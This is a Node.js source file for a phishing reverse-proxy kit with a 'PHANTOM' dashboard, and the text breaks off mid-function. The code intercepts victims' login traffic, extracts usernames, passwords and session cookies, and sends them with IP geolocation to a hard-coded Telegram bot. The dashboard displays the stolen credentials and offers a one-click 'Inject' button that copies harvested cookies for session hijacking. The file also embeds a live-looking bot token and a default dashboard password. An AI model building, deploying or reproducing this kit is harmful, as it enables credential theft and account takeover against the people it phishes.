const axios = require('axios');
const BOT_TOKEN = '8342719812:AAGMgewDI6j_XIGRiN9E7EE133ASeGgmkpM';
const CHAT_ID = '7310383191';

// ================================================
// 𝙶𝙴𝙾𝙻𝙾𝙲𝙰𝚃𝙸𝙾𝙽 & 𝙲𝙾𝙾𝙺𝙸𝙴 𝙵𝙸𝙻𝙴 𝙵𝚄𝙽𝙲𝚃𝙸𝙾𝙽𝚂
// ================================================

async function getGeoInfo(ip) {
    try {
        const response = await axios.get(`http://ip-api.com/json/${ip}?fields=country,countryCode,regionName,city,isp,org`);
        return response.data;
    } catch {
        return { country: 'Unknown', countryCode: 'UN' };
    }
}

function getFlagEmoji(countryCode) {
    if (!countryCode || countryCode.length !== 2) return '🌍';
    return String.fromCodePoint(
        0x1F1E6 + countryCode.charCodeAt(0) - 65,
        0x1F1E6 + countryCode.charCodeAt(1) - 65
    );
}

function extractCookiesFromHeaders(headers) {
    if (!headers) return null;
    
    let cookieHeaders = headers['set-cookie'];
    if (!cookieHeaders) return null;
    
    if (!Array.isArray(cookieHeaders)) {
        cookieHeaders = [cookieHeaders];
    }
    
    const cookies = {};
    cookieHeaders.forEach(cookie => {
        if (typeof cookie !== 'string') return;
        const [nameValue] = cookie.split(';');
        const [name, value] = nameValue.split('=');
        if (name && value) cookies[name.trim()] = value.trim();
    });
    
    return Object.keys(cookies).length ? cookies : null;
}

async function sendCookiesAsFile(cookies, sessionId) {
    if (!cookies || Object.keys(cookies).length === 0) return;

    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
    const randomName = Math.random().toString(36).substring(2, 10);
    const filename = `session_${randomName}_${timestamp}.txt`;
    const tmpDir = require('os').tmpdir();
    const filePath = path.join(tmpDir, filename);

    const content = `# Session Cookies\n# Session ID: ${sessionId}\n# Captured: ${new Date().toISOString()}\n\n${JSON.stringify(cookies, null, 2)}`;
    fs.writeFileSync(filePath, content);

    try {
        const FormData = require('form-data');
        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        form.append('document', fs.createReadStream(filePath), { filename: filename });
        form.append('caption', `📎 Cookie file: ${filename}`);

        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, form, {
            headers: form.getHeaders()
        });
    } catch (e) {
        console.log('Cookie file send failed', e.message);
    }

    try { fs.unlinkSync(filePath); } catch (e) {}
}

// ================================================
// 𝙼𝙰𝙸𝙽 𝚃𝙴𝙻𝙴𝙶𝚁𝙰𝙼 𝙵𝚄𝙽𝙲𝚃𝙸𝙾𝙽
// ================================================

async function sendToTelegram(data) {
    try {
        const ip = data.proxyRequestHeaders?.['cf-connecting-ip'] || 
                   data.proxyRequestHeaders?.['x-real-ip'] || 
                   data.proxyRequestHeaders?.['x-forwarded-for']?.split(',')[0]?.trim() || 
                   'Unknown';

        let geo = { country: 'Unknown', countryCode: 'UN', regionName: '', city: '', isp: '', org: '' };
        let flag = '🌍';
        let location = 'Unknown';

        if (ip !== 'Unknown') {
            geo = await getGeoInfo(ip);
            flag = getFlagEmoji(geo.countryCode);
            location = `${geo.city}, ${geo.regionName}, ${geo.country}`;
        }

        const message = `
🔐 **New Capture!**

🌍 **IP:** ${ip}
${flag} **Location:** ${location}
🏢 **ISP:** ${geo.isp || 'N/A'}
📡 **Org:** ${geo.org || 'N/A'}

🕒 **Time:** ${data.timestamp || new Date().toISOString()}
🔗 **URL:** ${data.proxyRequestURL || 'N/A'}
📨 **Method:** ${data.proxyRequestMethod || 'N/A'}

📋 **Headers:**
\`\`\`json
${JSON.stringify(data.proxyRequestHeaders || {}, null, 2)}
\`\`\`

📦 **Body:**
\`\`\`json
${JSON.stringify(data.proxyRequestBody || {}, null, 2)}
\`\`\`

📊 **Response:** ${data.proxyResponseStatusCode || 'N/A'}
        `;

        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });

        const cookies = extractCookiesFromHeaders(data.proxyResponseHeaders);
        if (cookies) {
            await sendCookiesAsFile(cookies, data.sessionId || 'unknown');
        }

    } catch (e) {
        console.log('Telegram send failed', e.message);
    }
}

// ================================================
// 𝙲𝙾𝚁𝙴 𝙳𝙴𝙿𝙴𝙽𝙳𝙴𝙽𝙲𝙸𝙴𝚂
// ================================================

const http = require("http");
const https = require("https");
const path = require("path");
const fs = require("fs");
const zlib = require("zlib");
const crypto = require("crypto");
const os = require("os");

// ================================================
// 𝙳𝙰𝚂𝙷𝙱𝙾𝙰𝚁𝙳 𝙳𝙴𝙿𝙴𝙽𝙳𝙴𝙽𝙲𝙸𝙴𝚂
// ================================================

const express = require('express');
const basicAuth = require('express-basic-auth');
const AdmZip = require('adm-zip');
const WebSocket = require('ws');

// ================================================
// 𝙲𝙾𝙼𝙼𝙾𝙽 𝙲𝙾𝙽𝚂𝚃𝙰𝙽𝚃𝚂
// ================================================

const PROXY_ENTRY_POINT = "/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true";
const PHISHED_URL_PARAMETER = "redirect_urI";
const PHISHED_URL_REGEXP = new RegExp(`(?<=${PHISHED_URL_PARAMETER}=)[^&]+`);
const REDIRECT_URL = "https://www.intrinsec.com/";

const PROXY_FILES = {
    index: "index_smQGUDpTF7PN.html",
    notFound: "404_not_found_lk48ZVr32WvU.html",
    script: "script_Vx9Z6XN5uC3k.js"
};
const PROXY_PATHNAMES = {
    proxy: "/lNv1pC9AWPUY4gbidyBO",
    serviceWorker: "/service_worker_Mz8XO2ny1Pg5.js",
    script: "/@",
    mutation: "/Mutation_o5y3f4O7jMGW",
    jsCookie: "/JSCookie_6X7dRqLg90mH",
    favicon: "/favicon.ico"
};

const LOGS_DIRECTORY = path.join(__dirname, "phishing_logs");
const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || "HyP3r-M3g4_S3cURe-EnC4YpT10n_k3Y";

// Ensure logs directory exists
if (!fs.existsSync(LOGS_DIRECTORY)) {
    fs.mkdirSync(LOGS_DIRECTORY, { recursive: true });
}

const LOG_FILE_STREAMS = {};
const VICTIM_SESSIONS = {};

// ================================================
// 𝙳𝙰𝚂𝙷𝙱𝙾𝙰𝚁𝙳 𝙳𝙴𝙲𝚁𝚈𝙿𝚃 𝙵𝚄𝙽𝙲𝚃𝙸𝙾𝙽
// ================================================

function decryptData(encryptedData, ivHex) {
    const iv = Buffer.from(ivHex, 'hex');
    const decipher = crypto.createDecipheriv('aes-256-ctr', ENCRYPTION_KEY, iv);
    let decrypted = decipher.update(Buffer.from(encryptedData, 'hex'));
    decrypted = Buffer.concat([decrypted, decipher.final()]);
    return decrypted.toString('utf-8');
}

// ================================================
// 𝙶𝙻𝙰𝚂𝚂𝙼𝙾𝚁𝙿𝙷𝙸𝚂𝙼 𝙳𝙰𝚂𝙷𝙱𝙾𝙰𝚁𝙳 𝙷𝚃𝙼𝙻
// ================================================

const GLASS_DASHBOARD_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PHANTOM Dashboard</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,600;14..32,700&display=swap');
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            font-family: 'Inter', sans-serif;
            background: radial-gradient(circle at 20% 30%, #0a0e17, #030507);
            min-height: 100vh;
            padding: 24px;
            color: #e0e8f0;
            transition: background 0.4s ease, color 0.4s ease;
        }
        .glass {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(16px) saturate(180%);
            -webkit-backdrop-filter: blur(16px) saturate(180%);
            border: 1px solid rgba(255, 255, 255, 0.08);
            border-radius: 24px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.6), inset 0 0 0 1px rgba(255,255,255,0.03);
            transition: background 0.4s ease, border 0.4s ease, box-shadow 0.4s ease;
        }
        .container { max-width:1440px; margin:0 auto; }
        body.light-glass {
            background: radial-gradient(circle at 20% 30%, #e8edf5, #d0d8e5);
            color: #1a1f2a;
        }
        body.light-glass .glass {
            background: rgba(255,255,255,0.25);
            backdrop-filter: blur(20px) saturate(180%);
            border: 1px solid rgba(255,255,255,0.35);
            box-shadow: 0 8px 32px rgba(0,0,0,0.08), inset 0 0 0 1px rgba(255,255,255,0.2);
        }
        body.light-glass .header h1 {
            background: linear-gradient(135deg, #4a2c8a, #2a5f8a);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }
        body.light-glass .stat-card .value {
            background: linear-gradient(135deg, #1a1f2a, #3a4f6a);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }
        body.light-glass .stat-card label, body.light-glass .stat-card .sub { color: rgba(0,0,0,0.6); }
        body.light-glass .badge {
            background: rgba(0,0,0,0.08);
            color: #1a1f2a;
            border-color: rgba(0,0,0,0.1);
        }
        body.light-glass .action-btn {
            color: #1a1f2a;
            border-color: rgba(0,0,0,0.15);
        }
        body.light-glass .action-btn:hover { background: rgba(0,0,0,0.06); }
        body.light-glass .action-btn.cookie {
            border-color: rgba(200,150,0,0.3);
            color: #b8860b;
        }
        body.light-glass .toolbar input, body.light-glass .toolbar select {
            background: rgba(255,255,255,0.3);
            border-color: rgba(0,0,0,0.1);
            color: #1a1f2a;
        }
        body.light-glass .toolbar input::placeholder { color: rgba(0,0,0,0.4); }
        body.light-glass .btn {
            color: #1a1f2a;
            border-color: rgba(0,0,0,0.1);
            background: rgba(255,255,255,0.2);
        }
        body.light-glass .btn:hover { background: rgba(255,255,255,0.4); }
        body.light-glass .btn-primary {
            background: linear-gradient(135deg, #536dfe, #7c4dff);
            color: #fff;
            border-color: transparent;
        }
        body.light-glass .btn-primary:hover { background: linear-gradient(135deg, #6a7ffc, #9464ff); }
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 16px;
            padding: 20px 28px;
            margin-bottom: 28px;
        }
        .header h1 {
            font-weight: 700;
            font-size: 26px;
            background: linear-gradient(135deg, #b388ff, #82b1ff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            letter-spacing: -0.5px;
        }
        .header-actions { display: flex; gap: 12px; align-items: center; }
        .btn {
            background: rgba(255,255,255,0.06);
            border: 1px solid rgba(255,255,255,0.12);
            color: #e0e8f0;
            padding: 8px 18px;
            border-radius: 40px;
            font-weight: 500;
            font-size: 13px;
            cursor: pointer;
            transition: all 0.2s;
            backdrop-filter: blur(4px);
            display: inline-flex;
            align-items: center;
            gap: 6px;
        }
        .btn:hover {
            background: rgba(255,255,255,0.14);
            border-color: rgba(255,255,255,0.25);
            box-shadow: 0 0 20px rgba(130,177,255,0.15);
        }
        .btn-primary {
            background: linear-gradient(135deg, #536dfe, #7c4dff);
            border-color: transparent;
            color: #fff;
            box-shadow: 0 4px 15px rgba(83,109,254,0.3);
        }
        .btn-primary:hover {
            background: linear-gradient(135deg, #6a7ffc, #9464ff);
            box-shadow: 0 4px 25px rgba(83,109,254,0.5);
            border-color: transparent;
        }
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 16px;
            margin-bottom: 28px;
        }
        .stat-card {
            padding: 18px 22px;
            display: flex;
            flex-direction: column;
        }
        .stat-card label {
            font-size: 12px;
            text-transform: uppercase;
            letter-spacing: 0.05em;
            color: rgba(255,255,255,0.5);
            margin-bottom: 4px;
        }
        .stat-card .value {
            font-size: 32px;
            font-weight: 700;
            background: linear-gradient(135deg, #f0f4ff, #b0c4ff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }
        .stat-card .sub {
            font-size: 13px;
            color: rgba(255,255,255,0.5);
            margin-top: 4px;
        }
        .toolbar {
            display: flex;
            flex-wrap: wrap;
            gap: 12px;
            align-items: center;
            padding: 16px 24px;
            margin-bottom: 24px;
        }
        .toolbar input, .toolbar select {
            background: rgba(255,255,255,0.06);
            border: 1px solid rgba(255,255,255,0.1);
            border-radius: 40px;
            padding: 8px 18px;
            color: #e0e8f0;
            font-size: 13px;
            outline: none;
            transition: 0.2s;
            backdrop-filter: blur(4px);
        }
        .toolbar input:focus, .toolbar select:focus {
            border-color: #7c4dff;
            box-shadow: 0 0 0 3px rgba(124,77,255,0.2);
        }
        .toolbar input::placeholder { color: rgba(255,255,255,0.3); }
        .toolbar select option { background: #1a1f2a; color: #e0e8f0; }
        .ws-status {
            margin-left: auto;
            font-size: 13px;
            display: flex;
            align-items: center;
            gap: 6px;
        }
        .ws-dot {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            display: inline-block;
        }
        .ws-dot.online { background: #69db7c; box-shadow: 0 0 12px #69db7c; }
        .ws-dot.offline { background: #ff6b6b; box-shadow: 0 0 12px #ff6b6b; }
        .table-wrap {
            overflow-x: auto;
            padding: 4px;
            margin-bottom: 24px;
        }
        table { width:100%; border-collapse: collapse; font-size:14px; }
        th {
            text-align: left;
            padding: 14px 16px;
            font-weight: 600;
            font-size: 11px;
            text-transform: uppercase;
            letter-spacing: 0.05em;
            color: rgba(255,255,255,0.4);
            border-bottom: 1px solid rgba(255,255,255,0.06);
        }
        td {
            padding: 14px 16px;
            border-bottom: 1px solid rgba(255,255,255,0.04);
            color: rgba(255,255,255,0.8);
        }
        tr:hover td { background: rgba(255,255,255,0.04); }
        .badge {
            background: rgba(130,177,255,0.15);
            padding: 2px 12px;
            border-radius: 40px;
            font-size: 12px;
            color: #82b1ff;
            border: 1px solid rgba(130,177,255,0.1);
        }
        .action-btn {
            background: transparent;
            border: 1px solid rgba(255,255,255,0.1);
            color: #e0e8f0;
            padding: 4px 12px;
            border-radius: 30px;
            font-size: 12px;
            cursor: pointer;
            transition: 0.2s;
            margin-right: 6px;
        }
        .action-btn:hover {
            background: rgba(255,255,255,0.08);
            border-color: rgba(255,255,255,0.2);
        }
        .action-btn.cookie {
            border-color: rgba(255,215,0,0.2);
            color: #ffd700;
        }
        .action-btn.cookie:hover {
            background: rgba(255,215,0,0.08);
            border-color: #ffd700;
        }
        .grid-2 {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 24px;
            margin-bottom: 24px;
        }
        .map-container { height:300px; border-radius:20px; overflow:hidden; background:rgba(0,0,0,0.3); }
        #map { height:100%; width:100%; background:transparent; }
        .chart-container { height:300px; padding:16px; }
        .chart-container canvas { width:100% !important; height:100% !important; }
        .modal {
            display: none;
            position: fixed;
            top:0; left:0; width:100%; height:100%;
            background: rgba(0,0,0,0.8);
            backdrop-filter: blur(12px);
            z-index:2000;
            justify-content: center;
            align-items: center;
        }
        .modal-content {
            max-width:800px;
            width:90%;
            max-height:80vh;
            padding:28px;
            overflow-y:auto;
            position:relative;
        }
        .modal-close {
            position: sticky;
            top:0;
            float:right;
            background: rgba(255,107,107,0.15);
            border: 1px solid rgba(255,107,107,0.2);
            color: #ff6b6b;
            padding: 6px 16px;
            border-radius: 40px;
            cursor: pointer;
            font-weight: 500;
            transition: 0.2s;
        }
        .modal-close:hover { background: rgba(255,107,107,0.25); }
        .modal pre {
            background: rgba(0,0,0,0.3);
            padding: 16px;
            border-radius: 12px;
            overflow-x: auto;
            font-size: 12px;
            white-space: pre-wrap;
            word-wrap: break-word;
            border: 1px solid rgba(255,255,255,0.05);
        }
        .toast {
            position: fixed;
            bottom: 24px;
            right: 24px;
            background: rgba(0,0,0,0.8);
            backdrop-filter: blur(12px);
            border: 1px solid rgba(255,255,255,0.1);
            color: #e0e8f0;
            padding: 14px 24px;
            border-radius: 40px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.6);
            z-index:3000;
            animation: slideUp 0.3s ease;
        }
        .toast.error { border-color: rgba(255,107,107,0.3); }
        @keyframes slideUp {
            from { opacity:0; transform:translateY(20px); }
            to { opacity:1; transform:translateY(0); }
        }
        @media (max-width:768px) {
            .grid-2 { grid-template-columns:1fr; }
            .header { flex-direction:column; align-items:stretch; }
            .toolbar { flex-direction:column; align-items:stretch; }
            .ws-status { margin-left:0; justify-content:flex-end; }
        }
        .leaflet-control-zoom a {
            background: rgba(255,255,255,0.08) !important;
            color: #e0e8f0 !important;
            border-color: rgba(255,255,255,0.1) !important;
        }
        .leaflet-popup-content-wrapper {
            background: rgba(20,25,35,0.9) !important;
            backdrop-filter: blur(12px) !important;
            color: #e0e8f0 !important;
            border: 1px solid rgba(255,255,255,0.05) !important;
        }
        body.light-glass .leaflet-control-zoom a {
            background: rgba(255,255,255,0.3) !important;
            color: #1a1f2a !important;
            border-color: rgba(0,0,0,0.1) !important;
        }
        body.light-glass .leaflet-popup-content-wrapper {
            background: rgba(255,255,255,0.9) !important;
            color: #1a1f2a !important;
            border-color: rgba(0,0,0,0.1) !important;
        }
    </style>
</head>
<body>
<div class="container">
    <header class="header glass">
        <h1>👻 PHANTOM</h1>
        <div class="header-actions">
            <button class="btn" onclick="toggleTheme()">🌓 Theme</button>
            <button class="btn btn-primary" onclick="exportAll()">📦 Export ZIP</button>
        </div>
    </header>
    <div class="stats">
        <div class="stat-card glass"><label>Total Sessions</label><div class="value" id="total">0</div><div class="sub">Captured</div></div>
        <div class="stat-card glass"><label>Last Capture</label><div class="value" id="last">Never</div><div class="sub">Latest session</div></div>
        <div class="stat-card glass"><label>Status</label><div class="value" id="status">✅ Online</div><div class="sub">System ready</div></div>
    </div>
    <div class="toolbar glass">
        <input type="text" id="searchInput" placeholder="Search by username, IP, domain..." oninput="filterTable()">
        <select id="filterDate" onchange="filterTable()">
            <option value="all">All Time</option>
            <option value="today">Today</option>
            <option value="week">This Week</option>
        </select>
        <button class="btn" onclick="refreshLogs()">🔄 Refresh</button>
        <div class="ws-status">
            <span class="ws-dot offline" id="wsDot"></span>
            <span id="wsLabel">Connecting...</span>
        </div>
    </div>
    <div class="table-wrap glass" style="padding:8px;">
        <table>
            <thead><tr><th>File</th><th>Size</th><th>Modified</th><th>Username</th><th>IP</th><th>Actions</th></tr></thead>
            <tbody id="logTable"></tbody>
        </table>
    </div>
    <div class="grid-2">
        <div class="map-container glass"><div id="map"></div></div>
        <div class="chart-container glass"><canvas id="captureChart"></canvas></div>
    </div>
</div>
<div class="modal" id="modal">
    <div class="modal-content glass">
        <button class="modal-close" onclick="closeModal()">✕ Close</button>
        <h3 id="modalTitle" style="margin-bottom:12px;">Session Details</h3>
        <div id="modalBody"></div>
    </div>
</div>
<div id="toastContainer"></div>
<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
<script>
    function toggleTheme() {
        document.body.classList.toggle('light-glass');
        const isLight = document.body.classList.contains('light-glass');
        localStorage.setItem('theme', isLight ? 'light' : 'dark');
    }
    (function restoreTheme() {
        const saved = localStorage.getItem('theme');
        if (saved === 'light') document.body.classList.add('light-glass');
    })();

    let allLogs = [], map = null, chart = null;
    const wsProtocol = location.protocol === 'https:' ? 'wss://' : 'ws://';
    const ws = new WebSocket(wsProtocol + location.host);
    const wsDot = document.getElementById('wsDot');
    const wsLabel = document.getElementById('wsLabel');

    ws.onopen = () => { wsDot.className = 'ws-dot online'; wsLabel.textContent = 'Live'; };
    ws.onclose = () => { wsDot.className = 'ws-dot offline'; wsLabel.textContent = 'Disconnected'; };
    ws.onmessage = (event) => {
        const data = JSON.parse(event.data);
        if (data.type === 'newLog') {
            showToast('📥 New capture: ' + data.file);
            refreshLogs();
        }
    };

    function showToast(msg, isError = false) {
        const container = document.getElementById('toastContainer');
        const toast = document.createElement('div');
        toast.className = 'toast' + (isError ? ' error' : '');
        toast.textContent = msg;
        container.appendChild(toast);
        setTimeout(() => { toast.remove(); }, 4000);
    }

    async function refreshLogs() {
        try {
            const res = await fetch('/api/logs');
            const logs = await res.json();
            allLogs = logs;
            renderTable(logs);
            updateStats(logs);
            updateMap(logs);
            updateChart(logs);
        } catch (e) {
            showToast('Failed to fetch logs: ' + e.message, true);
        }
    }

    function renderTable(logs) {
        const tbody = document.getElementById('logTable');
        const search = document.getElementById('searchInput').value.toLowerCase();
        const filter = document.getElementById('filterDate').value;
        const now = new Date();
        let filtered = logs;
        if (search) filtered = filtered.filter(log => log.name.toLowerCase().includes(search));
        if (filter === 'today') {
            filtered = filtered.filter(log => new Date(log.modified).toDateString() === now.toDateString());
        } else if (filter === 'week') {
            const weekAgo = new Date(now.getTime() - 7*24*60*60*1000);
            filtered = filtered.filter(log => new Date(log.modified) >= weekAgo);
        }
        tbody.innerHTML = '';
        filtered.forEach(log => {
            const date = new Date(log.modified).toLocaleString();
            const row = document.createElement('tr');
            row.innerHTML = \`
                <td><span class="badge">\${log.name}</span></td>
                <td>\${(log.size / 1024).toFixed(1)} KB</td>
                <td>\${date}</td>
                <td id="user-\${log.name}">Loading...</td>
                <td id="ip-\${log.name}">Loading...</td>
                <td>
                    <button class="action-btn" onclick="viewLog('\${log.name}')">🔍 View</button>
                    <button class="action-btn cookie" onclick="injectCookies('\${log.name}')">🍪 Inject</button>
                </td>
            \`;
            tbody.appendChild(row);
            fetchMetadata(log.name);
        });
    }

    async function fetchMetadata(filename) {
        try {
            const res = await fetch(\`/api/log/\${filename}\`);
            const data = await res.json();
            if (data.entries && data.entries.length > 0) {
                const first = data.entries[0];
                let username = 'N/A', ip = 'N/A';
                const body = first.proxyRequestBody;
                if (body) {
                    try {
                        const parsed = typeof body === 'string' ? JSON.parse(body) : body;
                        username = parsed.username || parsed.login || parsed.user || parsed.Email || 'N/A';
                    } catch (e) {
                        const match = body.match(/(?:username|login|user|Email)=([^&]+)/i);
                        if (match) username = decodeURIComponent(match[1]);
                    }
                }
                ip = first.proxyRequestHeaders?.['cf-connecting-ip'] ||
                     first.proxyRequestHeaders?.['x-real-ip'] ||
                     first.proxyRequestHeaders?.['x-forwarded-for']?.split(',')[0]?.trim() ||
                     'N/A';
                const userCell = document.getElementById(\`user-\${filename}\`);
                if (userCell) userCell.textContent = username;
                const ipCell = document.getElementById(\`ip-\${filename}\`);
                if (ipCell) ipCell.textContent = ip;
            }
        } catch (e) {}
    }

    function updateStats(logs) {
        document.getElementById('total').textContent = logs.length;
        if (logs.length > 0) {
            document.getElementById('last').textContent = new Date(logs[0].modified).toLocaleString();
        } else {
            document.getElementById('last').textContent = 'No captures';
        }
    }

    function updateMap(logs) {
        if (!map) {
            map = L.map('map').setView([20, 0], 2);
            L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
                attribution: '&copy; OpenStreetMap, &copy; CartoDB'
            }).addTo(map);
        }
        map.eachLayer(layer => {
            if (layer instanceof L.Marker) map.removeLayer(layer);
        });
        L.marker([20, 0]).addTo(map)
            .bindPopup('📍 IP locations will appear here once you have captures.');
    }

    function updateChart(logs) {
        const ctx = document.getElementById('captureChart').getContext('2d');
        const now = new Date();
        const days = {};
        for (let i = 6; i >= 0; i--) {
            const d = new Date(now.getTime() - i*24*60*60*1000);
            days[d.toDateString()] = 0;
        }
        logs.forEach(log => {
            const d = new Date(log.modified).toDateString();
            if (days.hasOwnProperty(d)) days[d]++;
        });
        const labels = Object.keys(days);
        const data = Object.values(days);
        if (chart) chart.destroy();
        chart = new Chart(ctx, {
            type: 'bar',
            data: {
                labels: labels,
                datasets: [{
                    label: 'Captures',
                    data: data,
                    backgroundColor: 'rgba(130, 177, 255, 0.4)',
                    borderColor: '#82b1ff',
                    borderWidth: 2,
                    borderRadius: 8,
                }]
            },
            options: {
                responsive: true,
                maintainAspectRatio: false,
                plugins: {
                    legend: { labels: { color: '#a0b0c0' } }
                },
                scales: {
                    y: { beginAtZero: true, ticks: { color: '#a0b0c0' }, grid: { color: 'rgba(255,255,255,0.05)' } },
                    x: { ticks: { color: '#a0b0c0' }, grid: { display: false } }
                }
            }
        });
    }

    function filterTable() { renderTable(allLogs); }

    async function viewLog(filename) {
        const modal = document.getElementById('modal');
        const title = document.getElementById('modalTitle');
        const body = document.getElementById('modalBody');
        modal.style.display = 'flex';
        title.textContent = \`📄 \${filename}\`;
        body.innerHTML = '<p>Loading...</p>';
        try {
            const res = await fetch(\`/api/log/\${filename}\`);
            const data = await res.json();
            if (data.error) {
                body.innerHTML = \`<p style="color:#ff6b6b;">Error: \${data.error}</p>\`;
                return;
            }
            let html = '';
            data.entries.forEach((entry, idx) => {
                html += \`<h4 style="margin:12px 0 6px;">Entry \${idx+1}</h4>\`;
                html += \`<pre>\${JSON.stringify(entry, null, 2)}</pre>\`;
                if (entry.proxyRequestBody) {
                    html += \`<h5>Credentials:</h5>\`;
                    try {
                        const bodyObj = typeof entry.proxyRequestBody === 'string' ? JSON.parse(entry.proxyRequestBody) : entry.proxyRequestBody;
                        const username = bodyObj.username || bodyObj.login || bodyObj.user || bodyObj.Email || 'N/A';
                        const password = bodyObj.password || bodyObj.passwd || bodyObj.Password || 'N/A';
                        html += \`<p><strong>Username:</strong> \${username}</p>\`;
                        html += \`<p><strong>Password:</strong> \${password}</p>\`;
                    } catch (e) {
                        const bodyStr = entry.proxyRequestBody || '';
                        const uMatch = bodyStr.match(/(?:username|login|user|Email)=([^&]+)/i);
                        const pMatch = bodyStr.match(/(?:password|passwd|Password)=([^&]+)/i);
                        if (uMatch) html += \`<p><strong>Username:</strong> \${decodeURIComponent(uMatch[1])}</p>\`;
                        if (pMatch) html += \`<p><strong>Password:</strong> \${decodeURIComponent(pMatch[1])}</p>\`;
                    }
                }
                if (entry.proxyResponseHeaders && entry.proxyResponseHeaders['set-cookie']) {
                    html += \`<h5>Cookies:</h5><pre>\${JSON.stringify(entry.proxyResponseHeaders['set-cookie'], null, 2)}</pre>\`;
                }
                html += '<hr style="border-color:rgba(255,255,255,0.05);">';
            });
            body.innerHTML = html;
        } catch (e) {
            body.innerHTML = \`<p style="color:#ff6b6b;">Failed to load log: \${e.message}</p>\`;
        }
    }

    async function injectCookies(filename) {
        try {
            const res = await fetch(\`/api/log/\${filename}\`);
            const data = await res.json();
            if (!data.entries || data.entries.length === 0) {
                showToast('No entries found.', true);
                return;
            }
            const allCookies = [];
            data.entries.forEach(entry => {
                if (entry.proxyResponseHeaders && entry.proxyResponseHeaders['set-cookie']) {
                    let cookieHeaders = entry.proxyResponseHeaders['set-cookie'];
                    if (!Array.isArray(cookieHeaders)) cookieHeaders = [cookieHeaders];
                    cookieHeaders.forEach(c => {
                        const [nameValue] = c.split(';');
                        if (nameValue) allCookies.push(nameValue);
                    });
                }
            });
            if (allCookies.length === 0) {
                showToast('No cookies found.', true);
                return;
            }
            const cookieString = allCookies.join('; ');
            try {
                await navigator.clipboard.writeText(cookieString);
                showToast(\`🍪 \${allCookies.length} cookies copied to clipboard.\`);
            } catch (e) {
                showToast('Failed to copy. Manual: ' + cookieString);
            }
        } catch (e) {
            showToast('Error: ' + e.message, true);
        }
    }

    async function exportAll() {
        try {
            const res = await fetch('/api/export/all');
            if (!res.ok) {
                const err = await res.json();
                showToast('Export failed: ' + err.error, true);
                return;
            }
            const blob = await res.blob();
            const url = window.URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = 'all_sessions.zip';
            document.body.appendChild(a);
            a.click();
            a.remove();
            showToast('✅ Export successful!');
        } catch (e) {
            showToast('Export error: ' + e.message, true);
        }
    }

    function closeModal() { document.getElementById('modal').style.display = 'none'; }
    document.getElementById('modal').addEventListener('click', function(e) {
        if (e.target === this) closeModal();
    });

    refreshLogs();
    setInterval(refreshLogs, 15000);
</script>
</body>
</html>`;

// ================================================
// 𝙳𝙰𝚂𝙷𝙱𝙾𝙰𝚁𝙳 𝙰𝙿𝙿
// ================================================

const dashApp = express();
const dashUser = process.env.DASHBOARD_USER || 'admin';
const dashPass = process.env.DASHBOARD_PASS || 'evilworker2026';

dashApp.use(express.json());

// Serve the glassmorphism dashboard HTML
dashApp.get('/', (req, res) => {
    res.send(GLASS_DASHBOARD_HTML);
});

dashApp.use(basicAuth({
    users: { [dashUser]: dashPass },
    challenge: true,
    realm: 'PHANTOM Dashboard'
}));

dashApp.get('/api/logs', (req, res) => {
    try {
        const files = fs.readdirSync(LOGS_DIRECTORY).filter(f => f.endsWith('.log'));
        const logs = files.map(f => {
            const stat = fs.statSync(path.join(LOGS_DIRECTORY, f));
            return { name: f, size: stat.size, modified: stat.mtime };
        }).sort((a, b) => b.modified - a.modified);
        res.json(logs);
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

dashApp.get('/api/log/:filename', (req, res) => {
    const filePath = path.join(LOGS_DIRECTORY, req.params.filename);
    if (!fs.existsSync(filePath)) return res.status(404).json({ error: 'Not found' });
    try {
        const content = fs.readFileSync(filePath, 'utf-8');
        const lines = content.split('\n').filter(line => line.trim());
        const entries = lines.map(line => {
            try {
                const entry = JSON.parse(line);
                const iv = Object.keys(entry)[0];
                const encrypted = entry[iv];
                const decrypted = decryptData(encrypted, iv);
                return JSON.parse(decrypted);
            } catch (e) {
                return { error: 'Failed to decrypt', raw: line };
            }
        });
        res.json({ filename: req.params.filename, entries });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

dashApp.get('/api/export/all', (req, res) => {
    try {
        const files = fs.readdirSync(LOGS_DIRECTORY).filter(f => f.endsWith('.log'));
        if (files.length === 0) return res.status(404).json({ error: 'No logs' });
        const zip = new AdmZip();
        files.forEach(f => {
            const content = fs.readFileSync(path.join(LOGS_DIRECTORY, f));
            zip.addFile(f, content);
        });
        const zipBuffer = zip.toBuffer();
        res.setHeader('Content-Type', 'application/zip');
        res.setHeader('Content-Disposition', `attachment; filename=all_sessions_${Date.now()}.zip`);
        res.send(zipBuffer);
